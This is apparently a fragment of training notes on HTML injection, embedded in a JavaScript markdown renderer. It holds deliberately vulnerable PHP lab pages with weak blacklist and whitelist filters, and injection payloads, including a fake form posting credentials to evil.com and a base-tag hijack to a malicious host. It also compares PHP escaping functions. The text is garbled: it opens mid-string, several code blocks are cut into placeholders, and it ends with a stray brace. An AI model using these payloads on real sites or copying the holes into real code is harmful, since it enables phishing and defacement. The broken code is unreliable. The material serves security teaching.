html-injection-black-list.php\n\n```python\nhtml-injection-black-list.php\n```\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection Black List</title>\n</head>\n<body>\n    <h1>Html Injection Black List</h1>\n    <?php\n        if (isset($_REQUEST['user'])) {\n            $user_name = preg_replace(\"/<|>/\", \"\", $_REQUEST['user']);\n            echo \"<h2>\" . $user_name . \"!! </h2>\";\n        }\n    ?>\n</body>\n</html>\n```\n**Alternative version with urldecode:**\n```php\necho \"<h2>\" . urldecode($user_name) . \"!! </h2>\";\n```\n\n## Blacklist POST Example: html-injection-black-list-post.php\n\n```python\nhtml-injection-black-list-post.php\n```\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection Black List</title>\n</head>\n<body>\n    <h1>Html Injection Black List</h1>\n    <form action=\"html-injection-black-list.php\" method=\"POST\">\n        User Name: <input type=\"text\" name=\"user\"><br />\n        <input type=\"submit\" value=\"login\">\n    </form>\n    <?php\n        if (isset($_REQUEST['user'])) {\n            $user_name = preg_replace(\"/<|>/\", \"\", $_REQUEST['user']);\n            echo \"<h2>\" . $user_name . \"!! </h2>\";\n        }\n    ?>\n</body>\n</html>\n```\n # through encoding hum kar salkte hai kyunki get parameter se gai value server decode karta hai post se nhi---\n## Whitelist Examples\n***\n## html-injection-white-list.php\n***\nBelow is your provided code, updated only for layout consistency and readability. The **HTML injection vulnerability remains** because the regex does not fully validate input (it only checks if at least one allowed character is present anywhere in the input), so injection is still possible.\n\n```python\nhtml-injection-white-list.php\n```\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection White List</title>\n</head>\n<body>\n    <h1>Html Injection White List</h1>\n\n    <form action=\"html-injection-white-list.php\" method=\"POST\">\n        User Name: <input type=\"text\" name=\"user\"><br />\n        <input type=\"submit\" value=\"login\">\n    </form>\n\n    <?php\n        if (isset($_REQUEST['user'])) {\n\n            $user_name = $_REQUEST['user'];\n\n            // This regex only checks for the presence of at least one allowed character.\n            // Inputs with both allowed and unallowed characters will still pass through.\n            if (!preg_match('/[a-z\\d\\.\\-\\_]/i', $user_name)) {\n                die(\"Don't try to Inject Code\");\n            } else {\n                // No sanitization or escaping; still vulnerable to HTML injection!\n                echo \"<h2>\" . $user_name . \"!! </h2>\";\n            }\n        }\n    ?>\n\n</body>\n</html>\n```\n\n**Vulnerability explanation:**\n*   The regular expression `/[a-z\\d\\.\\-\\_]/i` will match as long as there is at **least one** allowed character in the input, not that the **entire** input is only allowed characters.\n    *   Input like `<h1>Injected</h1>` will **pass** the check because `h`, `i`, and `n` are in the allowed set.\n*   No output escaping is done before echoing the value in the `<h2>`, so HTML code in the input is rendered.\n*   Thus, an attacker can still inject arbitrary HTML into the output.\n\n---\n## html-injection-white-list2.php\n***\n```python\nhtml-injection-white-list2.php\n```\n\nBelow is your provided code, updated for whitespace, indentation, and readability only.\n\n**The vulnerability is preserved.**\n\nThe regular expression used does NOT fully validate that the entire input contains only allowed characters, so HTML injection remains possible.\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection White List - 2</title>\n</head>\n<body>\n    <h1>Html Injection White List - 2</h1>\n    \n    <form action=\"html-injection-white-list2.php\" method=\"POST\">\n        User Name: <input type=\"text\" name=\"user\"><br />\n        <input type=\"submit\" value=\"login\">\n    </form>\n\n    <?php\n        if (isset($_REQUEST['user'])) {\n            $user_name = $_REQUEST['user'];\n\n            // This regex only checks if the first character is allowed.\n            // Any subsequent characters can be anything, so input like \"<h1>Injected</h1>\" will pass if it starts with a letter.\n            if (!preg_match('/^[a-z\\d\\.\\-\\_]/i', $user_name)) {\n                die(\"Don't try to Inject Code\");\n            } else {\n                // No output sanitization: this is still vulnerable to HTML injection!\n                echo \"<h2>\" . $user_name . \" !! </h2>\";\n            }\n        }\n    ?>\n</body>\n</html>\n```\n\n*   The regular expression `/^[a-z\\d\\.\\-\\_]/i` only checks whether the **first character** is in the allowed list (`a-z`, `0-9`, `.`, `-`, or `_`).\n*   Any characters AFTER the first can be anything—including HTML tags or other injection payloads.\n    *   Example: `A[script]` will pass the check.\n*   The value is printed directly inside `<h2>` without encoding or sanitization.\n\nAn attacker can submit a payload that starts with an allowed character and inject arbitrary HTML into the page, maintaining the vulnerability as requested.\n\n---\n## html-injection-white-list3.php\n***\n```bash\nvim html-injection-white-list3.php\n```\n\n**The vulnerability is preserved.**\n\nHowever, this version uses a stricter regular expression, which **only allows letters, digits, dot, dash, and underscore** throughout the whole input (`/^[a-z\\d\\.\\-\\_]*$/i`).\n\nSo basic HTML Injection via angle brackets (`<` and `>`) is blocked, but it is still important to note that the code does not perform output encoding or escaping.\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection White List - 3</title>\n</head>\n<body>\n    <h1>Html Injection White List - 3</h1>\n\n    <form action=\"html-injection-white-list3.php\" method=\"POST\">\n        User Name: <input type=\"text\" name=\"user\"><br />\n        <input type=\"submit\" value=\"login\">\n    </form>\n\n    <?php\n        if (isset($_REQUEST['user'])) {\n\n            $user_name = $_REQUEST['user'];\n\n            // This regex only allows a-z, 0-9, dot, dash, and underscore, any length (including empty string).\n            if (!preg_match('/^[a-z\\d\\.\\-\\_]*$/i', $user_name)) {\n                die(\"Don't try to Inject Code\");\n            } else {\n                // No output sanitization: printing directly in HTML context.\n                echo \"<h2>\" . $user_name . \" !! </h2>\";\n            }\n        }\n    ?>\n</body>\n</html>\n```\n\n### Vulnerability Analysis\n\n*   **Only these characters are accepted**:\n    *   `A-Z, a-z, 0-9, _, -, .`\n*   **No output encoding**:\n    *   The code echoes `$user_name` directly inside an HTML element.\n*   **Potential risk:**\n    *   Angle brackets are **not** allowed, so basic HTML injection using tags like `[script]\n```\n\n**Attack URL Example:**\n`https://example.com/index.html?user=<img src='x' onerror='alert(1)'>`\nThis will execute arbitrary injected HTML or JavaScript within the page context.\n\n## 2. JavaScript `document.write()` Vulnerability\nUser input included in a document using `document.write()` also enables HTML injection.\n\n```html\n[script]\n```\n\n**Attack URL Example:**\n`https://example.com/page.html?user=<h2>Injected!</h2>`\nThe page will display the injected header in place.\n\n## 3. Fake Form Injection for Data Theft\nIf user input is echoed unescaped in a web page, an attacker can inject a fake form to phish credentials from users.\n\n```php\n<?php\n// Suppose GET/POST 'msg' is printed on a site\nif (isset($_GET['msg'])) {\n    echo \"<div>\" . $_GET['msg'] . \"</div>\";\n}\n?>\n```\n\n**Attack Payload Example:**\n`?msg=<form action='http://evil.com' method='POST'><input name='user'><input type='submit'></form>`\nA victim sees a fake form, potentially entering sensitive data unknowingly.\n\n## 4. Injecting `<base>` Tag to Hijack Relative URLs\nIf input is not sanitized and inserted into the page header or body, injecting a `<base>` tag can change the behavior of all relative URLs.\n\n```php\n<?php\n// Suppose 'custom' is concatenated into the HTML\necho \"<html><head>\" . $_GET['custom'] . \"</head><body> ... \";\n?>\n```\n\n**Attack Example:**\n`?custom=<base href='http://malicious.site2/'>`\nNow, form submissions, script includes, and links on the page can be hijacked to a malicious site.\n\n## 5. Message Board Vulnerability\nA classic example: a message board where the posted message is rendered without escaping.\n\n```php\n<?php\n// Unsafe posts are inserted into the page\necho \"<b>\" . $_POST['username'] . \"</b>: \" . $_POST['message'] . \"<br>\";\n?>\n```\n\n**Attack Example:**\nMessage: `<b>Hacked!</b>[iframe]`\nThis allows embed of arbitrary, potentially harmful content.\n\n## 6. Exploiting HTML Injection in Email Templates\nIf user input is not sanitized in dynamically generated emails, malicious HTML can be sent to recipients.\n\n```php\n$email_body = \"Hello \" . $_POST['name'] . \", welcome!\";\nmail($to, \"Welcome\", $email_body);\n```\n\n**Attack Example:**\nPOST `name=<img src=\"x\" onerror=\"alert('XSS')\">`\nThe malicious payload executes in an HTML-supporting mail client.\n\n## Key Takeaways\n***\n*   Unescaped user input in `HTML`, `JS`, or even email templates is dangerous.\n*   HTML injection can be exploited for content defacement, phishing, session/cookie theft, or redirection to malicious sites.\n*   Always sanitize or properly encode user-provided content before rendering.\n\n---\n## **Difference: htmlentities() vs htmlspecialchars() in PHP**\n\nBoth `htmlentities()` and `htmlspecialchars()` are PHP functions used to encode special characters for safe HTML output, but they differ in how much they encode and their intended use cases.\n\n---\n\n**1. htmlspecialchars()**\n*   **Purpose:** Converts (escapes) **only** a subset of special characters (HTML entities) to their corresponding HTML codes.\n*   **Main characters escaped:**\n    *   `<` becomes `&lt;`\n    *   `>` becomes `&gt;`\n    *   `&` becomes `&amp;`\n    *   `\"` becomes `&quot;`\n    *   (optionally) `'` becomes `&#039;` (if `ENT_QUOTES` flag is used)\n\n**Example**\n```php\necho htmlspecialchars(\"<b>hello & 'world'</b>\");\n// Output: &lt;b&gt;hello &amp; 'world'&lt;/b&gt;\n```\n\n**2. htmlentities()**\n*   **Purpose:** Converts **all** characters that have a corresponding HTML entity to their entities, including all those covered by `htmlspecialchars()`, PLUS additional ones (e.g., characters with accents, ©, ™, non-ASCII, etc.).\n*   **Encodes much more:** Useful for internationalization or when displaying arbitrary user content as literal text.\n\n**Example**\n```php\necho htmlentities(\"© 2025 <b>hello ' & 'world'</b>\");\n// Output: &copy; 2025 &lt;b&gt;hello &#039; &amp; &#039;world&#039;&lt;/b&gt;\n```\n\n---\n\n**Summary Table**\n\n| Function | Escapes minimal HTML? | Escapes all entities? | Typical Use |\n| :--- | :--- | :--- | :--- |\n| `htmlspecialchars` | Yes | No | User input in HTML context |\n| `htmlentities` | Yes | Yes | All content as plain text |\n\n**When to Use Which?**\n\n*   Use `htmlspecialchars()` when you only need to convert the essential characters that pose a risk for HTML injection (most common for echoing user input into HTML).\n*   Use `htmlentities()` when you want to encode the text as literally and safely as possible in HTML, including all special characters and symbols.\n\nIn most secure web applications, `htmlspecialchars()` is sufficient for user input unless you must show ALL user data (including international or symbol characters) literally.\n\n**Reference**\n\n*   [PHP: htmlspecialchars - Manual](https://php.net/htmlspecialchars)\n*   [PHP: htmlentities - Manual](https://php.net/htmlentities)\n\n**In summary:**\n\n- `htmlspecialchars()` -> basic HTML safety\n- `htmlentities()` -> maximum encoding for all entities\n\nBoth help prevent HTML injection and XSS when used for outputting user data.\n\n---\n## **HTML Escaping Functions and Their Encoded Characters**\n\n|Language|Function Name|Encoded Characters|\n|---|---|---|\n|**PHP**|`htmlspecialchars()`|`<`, `>`, `&`, `\"`, `'` (if `ENT_QUOTES`)|\n|**PHP**|`htmlentities()`|`<`, `>`, `&`, `\"`, `'`, and all HTML entities (e.g. `© → &copy;`)|\n|**Python**|`html.escape()`|`<`, `>`, `&`, `\"`|\n|**Java**|`StringEscapeUtils.escapeHtml4()`|`<`, `>`, `&`, `\"`, `'`, and all HTML entities|\n|**JavaScript**|`he.encode()`|`<`, `>`, `&`, `\"`, `'`, and all HTML entities|\n|**Ruby**|`ERB::Util.html_escape()`|`<`, `>`, `&`, `\"`, `'`|\n|**Go**|`template.HTMLEscapeString()`|`<`, `>`, `&`, `\"`|\n|**C#**|`WebUtility.HtmlEncode()`|`<`, `>`, `&`, `\"`, `'`|\n|**C#**|`HttpUtility.HtmlEncode()`|`<`, `>`, `&`, `\"`, `'`|\n|**Perl**|`HTML::Entities::encode_entities()`|`<`, `>`, `&`, `\"`, `'`, and all HTML entities|\n|**Rust**|`ammonia::clean()` (sanitization)|Removes or escapes unsafe tags and attributes (not just characters)|\n\n---\n---"}, {"name": "iframe injection", "content": "# HTML Injection - IFrame Vulnerable\n\nHTML injection in an iframe context means user input is directly inserted into the `src` attribute of an `[iframe]\n\n</body>\n</html>\n```\n\n* It is **vulnerable to HTML Injection** (or web injection) because the `url` parameter is directly injected into the iframe `src` attribute without any validation or sanitization.\n\n## Explanation of Vulnerability\n\n• The value of `$_GET['url']` is inserted **directly** into the `src` attribute of the `[iframe]\n\n</body>\n</html>\n```\n\n## Vulnerability Details\n\n• The `<select>` options suggest users can only choose n        case '1':\n            $url = \"https://www.armourinfosec.com/\";\n            break;\n            \n        case '2':\n            $url = \"https://www.google.com/\";\n            break;\n            \n        case '3':\n            $url = \"https://www.facebook.com/\";\n            break;\n            \n        default:\n            $url = \"http://192.168.1.45/\";\n            break;\n    }\n}\n?>\n\n[iframe]\n\n</body>\n</html>\n```\n\n## Security Notes\n\n• Because URLs are strictly selected within a `switch` statement on a controlled set of values ( 0 - 3 ), users **cannot directly inject arbitrary strings into the iframe source via the form**.\n• However, if an attacker manually crafts a POST request with an unexpected `website` value **not covered by the cases**, the default URL `http://192.168.1.45/` is loaded, which is safe.\n• The `$url` value is echoed without escaping, but since it contains only fixed, trusted URLs, the risk of injection here is minimal.\n• This approach is a **basic whitelist model** restricting input to known safe options.\n\n**This code** remains vulnerable** if the whitelist block is changed or bypassed, but as-is it limits arbitrary injection vectors.\n\n## Summary Table\n\n| File                       | User Controls src? | Vulnerable to Arbitrary URL? | Notes                  |\n| -------------------------- | ------------------ | ---------------------------- | ---------------------- |\n| html-injection-iframe.php  | Yes (via GET)      | **Yes**                      | Most dangerous         |\n| html-injection-iframe2.php | Yes (via POST)     | **Yes** (with crafted POST)  | Hidden risk            |\n| html-injection-iframe3.php | Menu only          | **No** (predefined URLs)     | Safer due to whitelist |\n\n---\n---"}];

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

function renderMd(raw) {
  var lines = raw.split('\n');
  var out = '';
  var inCode = false;
  var codeBuffer = '';
  var inList = false;

  for (var i = 0; i < lines.length; i++) {
    var line = lines[i];
    if (line.match(/^```/)) {
      if (!inCode) {
        if (inList) { out += '</ul>'; inList = false; }
        inCode = true; codeBuffer = '';
      } else {
        inCode = false;
        out += '<pre><code>' + escHtml(codeBuffer) + '</code></pre>';
        codeBuffer = '';
      }
      continue;
    }
    if (inCode) { codeBuffer += (codeBuffer ? '\n' : '') + line; continue; }
    var e = escHtml(line);
    if (e.match(/^#### /)) { if(inList){out+='</ul>';inList=false;} out += '<h4>' + e.slice(5) + '</h4>'; continue; }
    if (e.match(/^### /))  { if(inList){out+='</ul>';inList=false;} out += '<h3>' + e.slice(4) + '</h3>'; continue; }
    if (e.match(/^## /))   { if(inList){out+='</ul>';inList=false;} out += '<h2>' + e.slice(3) + '</h2>'; continue; }
    if (e.match(/^# /))    { if(inList){out+='</ul>';inList=false;} out += '<h1>' + e.slice(2) + '</h1>'; continue; }
    if (e.match(/^---+$/)) { if(inList){out+='</ul>';inList=false;} out += '<hr>'; continue; }
    if (e.match(/^&gt; /)) { if(inList){out+='</ul>';inList=false;} out += '<blockquote>' + inlineFmt(e.slice(5)) + '</blockquote>'; continue; }
    if (e.match(/^[\*\-] /) || e.match(/^\d+\. /)) {
      if (!inList) { out += '<ul>'; inList = true; }
      var txt = e.match(/^[\*\-] /) ? e.slice(2) : e.replace(/^\d+\.\s/,'');
      out += '<li>' + inlineFmt(txt) + '</li>';
      continue;
    }
    if (e.trim() === '') {
      if (inList) { out += '</ul>'; inList = false; }
      out += '<br>';
      continue;
    }
    if (inList) { out += '</ul>'; inList = false; }
    out += '<p>' + inlineFmt(e) + '</p>';
  }
  if (inList) out += '</ul>';
  if (inCode) out += '<pre><code>' + escHtml(codeBuffer) + '</code></pre>';
  return out;
}

function inlineFmt(t) {
  t = t.replace(/`([^`]+)`/g, function(m,c){ return '<code>' + c + '</code>'; });
  t = t.replace(/\*\*\*([^*]+)\*\*\*/g, '<strong><em>$1</em></strong>');
  t = t.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
  t = t.replace(/\*([^*]+)\*/g, '<em>$1</em>');
  t = t.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
  return t;
}

}
